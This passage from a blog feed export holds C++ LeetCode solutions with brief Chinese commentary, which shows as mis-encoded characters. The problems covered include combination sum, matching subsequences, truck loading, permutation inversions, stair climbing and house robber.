class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> target;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combinationSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;target = target;</span><br><span class="line">        n = candidates.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">        <span class="built_in">search</span>(<span class="number">0</span>, <span class="number">0</span>, vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> sum, vector&lt;<span class="type">int</span>&gt; &amp; vec, vector&lt;<span class="type">int</span>&gt;&amp;&amp; candidates)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum &gt; target) <span class="keyword">return</span>;</span><br><span class="line">        vec.<span class="built_in">push_back</span>(candidates[index]);</span><br><span class="line">        <span class="built_in">search</span>(index, sum+candidates[index], vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        vec.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="keyword">if</span>(index+<span class="number">1</span> &lt; n) &#123;</span><br><span class="line">            <span class="built_in">search</span>(index+<span class="number">1</span>, sum, vec, <span class="built_in">move</span>(candidates));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç¡¬æœï¼Œä¸è¦é‡å¤å°±å¥½äº†</p></blockquote><h2 id="792-åŒ¹é…å­åºåˆ—çš„å•è¯æ•°"><a href="#792-åŒ¹é…å­åºåˆ—çš„å•è¯æ•°" class="headerlink" title="792. åŒ¹é…å­åºåˆ—çš„å•è¯æ•°"></a><a href="https://leetcode.cn/problems/number-of-matching-subsequences/">792. åŒ¹é…å­åºåˆ—çš„å•è¯æ•°</a></h2><h3 id="è¶…æ—¶1"><a href="#è¶…æ—¶1" class="headerlink" title="è¶…æ—¶1"></a>è¶…æ—¶1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numMatchingSubseq</span><span class="params">(string s, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isSubstr</span>(<span class="built_in">move</span>(s), <span class="built_in">move</span>(words[i]))) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubstr</span><span class="params">(string&amp;&amp; s, string&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nw = word.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(nw, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=(word[<span class="number">0</span>]==s[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>], <span class="built_in">int</span>(word[<span class="number">0</span>]==s[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nw;i++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="built_in">max</span>(dp[<span class="number">0</span>][i<span class="number">-1</span>], <span class="built_in">int</span>(s[<span class="number">0</span>]==word[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nw; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="built_in">int</span>(s[i] == word[j]),<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; dp[n-1][nw-1] &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][nw<span class="number">-1</span>]==nw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="è¶…æ—¶2"><a href="#è¶…æ—¶2" class="headerlink" title="è¶…æ—¶2"></a>è¶…æ—¶2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numMatchingSubseq</span><span class="params">(string s, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = words.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;string, <span class="type">bool</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(m.<span class="built_in">count</span>(words[i])) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isSubstr</span>(<span class="built_in">move</span>(s), <span class="built_in">move</span>(words[i]))) &#123;</span><br><span class="line">                m[words[i]] = <span class="literal">true</span>;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubstr</span><span class="params">(string&amp;&amp; s, string&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nw = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; nw; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(;j&lt;n &amp;&amp; word[i] != s[j]; j++);</span><br><span class="line">            <span class="keyword">if</span>(j == n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1710-å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°&quot;&gt;&lt;a href=&quot;#1710-å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°&quot; class=&quot;headerlink&quot; title=&quot;1710. å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/maximum-units-on-a-truck/&quot;&gt;1710. å¡è½¦ä¸Šçš„æœ€å¤§å•å…ƒæ•°&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;maximumUnits&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; boxTypes, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; truckSize)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;sort&lt;/span&gt;(boxTypes.&lt;span class=&quot;built_in&quot;&gt;begin&lt;/span&gt;(), boxTypes.&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;(), [](vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; x, vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; y)-&amp;gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; x[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &amp;gt; y[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = boxTypes.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(truckSize) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ret += &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(truckSize, boxTypes[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])*boxTypes[i][&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                truckSize -= &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(truckSize, boxTypes[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 50 + 27 + 14 = 91&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;ç®€å•é¢˜ï¼Œæ’ä¸ªåºå°±è¡Œ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;775-å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®&quot;&gt;&lt;a href=&quot;#775-å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®&quot; class=&quot;headerlink&quot; title=&quot;775. å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/global-and-local-inversions/&quot;&gt;775. å…¨å±€å€’ç½®ä¸å±€éƒ¨å€’ç½®&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;isIdealPermutation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;(); i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(nums[i] - i) &amp;gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;æœ€å¼€å§‹æƒ³å¤æ‚äº†ï¼Œæƒ³ç”¨å·®åˆ†æ•°ç»„ç»Ÿè®¡ä¸ªæ•°&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-dp</title>
    <link href="https://jingtianer.github.io/home/2022/11/08/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93dp/"/>
    <id>https://jingtianer.github.io/home/2022/11/08/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93dp/</id>
    <published>2022-11-08T03:14:34.000Z</published>
    <updated>2023-02-13T18:49:59.264Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>leetcode 101çš„åŠ¨æ€è§„åˆ’ä¸“é¢˜</p></blockquote><h2 id="åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´"><a href="#åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´" class="headerlink" title="åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´"></a>åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´</h2><h3 id="70-çˆ¬æ¥¼æ¢¯"><a href="#70-çˆ¬æ¥¼æ¢¯" class="headerlink" title="70. çˆ¬æ¥¼æ¢¯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">70. çˆ¬æ¥¼æ¢¯</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;n ; i++) &#123;</span><br><span class="line">            <span class="type">int</span> c = a+b;</span><br><span class="line">            a=b;</span><br><span class="line">            b=c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>dpæ•°ç»„è¡¨ç¤ºä¸Šnå±‚æ¥¼æœ‰å‡ ç§å¯èƒ½<br>è½¬ç§»æ–¹ç¨‹æ˜¯ $ dp[i] &#x3D; dp[i-1] + dp[i-2] $<br>ä¸Šåˆ°ç¬¬iå±‚æœ‰å¯èƒ½ä»ç¬¬i-1å±‚æˆ–i-2å±‚ä¸Šæ¥ï¼Œåˆ™ä¸Šåˆ°iå±‚çš„å¯èƒ½æ•°ç›®å°±æ˜¯ $ dp[i-1] + dp[i-2] $<br>ç”±äºdp[i]åªéœ€è¦å‰ä¸¤ä¸ªæ•°çš„æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥ä¼˜åŒ–æ‰dpæ•°ç»„ï¼Œç”¨ä¸¤ä¸ªå˜é‡ä»£æ›¿ï¼ŒèŠ‚çœæ•°ç»„ç©ºé—´</p></blockquote><h3 id="198-æ‰“å®¶åŠ«èˆ"><a href="#198-æ‰“å®¶åŠ«èˆ" class="headerlink" title="198. æ‰“å®¶åŠ«èˆ"></a><a href="https://leetcode.cn/problems/house-robber/">198. æ‰“å®¶åŠ«èˆ</a></h3><h4 id="çŠ¶æ€è®°å½•"><a href="#çŠ¶æ€è®°å½•" class="headerlink" title="çŠ¶æ€è®°å½•"></a>çŠ¶æ€è®°å½•</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; mem;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = nums.<span class="built_in">size</span>();</span><br><span class="line">        mem = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">2</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">maxRob</span>(nums, <span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxRob</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; n &amp;&amp; mem[i+<span class="number">2</span>] != <span class="number">-1</span>) <span class="keyword">return</span> mem[i+<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> a = (i+<span class="number">2</span> &lt; n ? <span class="built_in">maxRob</span>(nums, i+<span class="number">2</span>) + nums[i+<span class="number">2</span>] : <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> b = (i+<span class="number">3</span> &lt; n ? <span class="built_in">maxRob</span>(nums, i+<span class="number">3</span>) + nums[i+<span class="number">3</span>] : <span class="number">0</span>);</span><br><span class="line">        mem[i+<span class="number">2</span>] = (a &gt; b? a : b);</span><br><span class="line">        <span class="keyword">return</span> mem[i+<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ˜¯ä¹‹å‰å®ä¹ æ—¶å†™çš„ä»£ç æ€è·¯ä¸æ˜¯dpï¼Œè€Œæ˜¯è‡ªä¸Šè€Œä¸‹çš„å¸¦æœ‰çŠ¶æ€è®°å½•çš„ä¼˜å…ˆæœç´¢<br>æ€è·¯ç›¸åŒï¼Œå°±æ˜¯ï¼Œè‹¥æ‰“åŠ«iï¼Œåˆ™ä¸€å®šä¸èƒ½æ‰“åŠ«i+1ï¼Œè€ƒè™‘æ˜¯æ‰“åŠ«i+2è¿˜æ˜¯i+3<br>çŠ¶æ€è½¬ç§»æ–¹ç¨‹ $ dp[i] &#x3D; nums[i] + max(dp[i+2], dp[i+3]) $</p></blockquote><h4 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(len)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[len<span class="number">-1</span>];</span><br><span class="line">        &#125; <span 